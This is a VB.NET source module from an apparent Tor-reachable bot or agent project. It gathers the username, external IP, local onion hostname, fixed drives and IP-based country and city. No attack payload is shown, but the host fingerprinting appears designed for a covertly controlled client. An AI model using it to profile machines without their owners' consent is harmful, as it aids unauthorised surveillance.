Imports System.Globalization
Imports System.IO
Imports System.Net
Imports Alduin.Stump.Alduin.Stump.Models
Imports Newtonsoft.Json

Module Details
    Public Function GetUsername() As String
        Return Environment.UserName
    End Function
    Public Function GetMyIPAddress() As String
        Dim webclient As New WebClient
        Return webclient.DownloadString("http://requestbin.net/ip")
    End Function
    Public Function GetOnionAddress()
        Try
            Return My.Computer.FileSystem.ReadAllText(GetTorFolder() & "/hostname")
        Catch ex As Exception
            Return "N/A"
        End Try
    End Function
    Public Function GetDiscName() As ArrayList
        Dim disc As New ArrayList
        For Each curDrive As DriveInfo In My.Computer.FileSystem.Drives
            If curDrive.DriveType = DriveType.Fixed Then
                If curDrive.TotalFreeSpace > 0 Then
                    disc.Add(curDrive.Name)
                End If
            End If
        Next
        Return disc
    End Function
    Public Function GetCounty(ByVal ip As String)
        Dim ipInfo As IpInfoModel = New IpInfoModel()

        Try
            Dim info As String = New WebClient().DownloadString("http://ipinfo.io/" & ip)
            ipInfo = JsonConvert.DeserializeObject(Of IpInfoModel)(info)
            Dim myRI1 As RegionInfo = New RegionInfo(ipInfo.Country)
            ipInfo.Country = myRI1.EnglishName
        Catch __unusedException1__ As Exception
            ipInfo.Country = Nothing
        End Try

        Return ipInfo.Country
    End Function
    Public Function GetCountyCode(ByVal ip As String)
        Dim ipInfo As IpInfoModel = New IpInfoModel()

        Try
            Dim info As String = New WebClient().DownloadString("http://ipinfo.io/" & ip)
            ipInfo = JsonConvert.DeserializeObject(Of IpInfoModel)(info)
        Catch __unusedException1__ As Exception
            ipInfo.Country = Nothing
        End Try

        Return ipInfo.Country
    End Function
    Public Function GetCity(ByVal ip As String)
        Dim ipInfo As IpInfoModel = New IpInfoModel()

        Try
            Dim info As String = New WebClient().DownloadString("http://ipinfo.io/" & ip)
            ipInfo = JsonConvert.DeserializeObject(Of IpInfoModel)(info)
        Catch __unusedException1__ As Exception
            ipInfo.City = Nothing
        End Try

        Return ipInfo.City
    End Function
    Public Function GetConfigJson() As ConfigModel
        Return JsonConvert.DeserializeAnonymousType(Get_JsonFilewithPath(), New ConfigModel)
    End Function
End Module
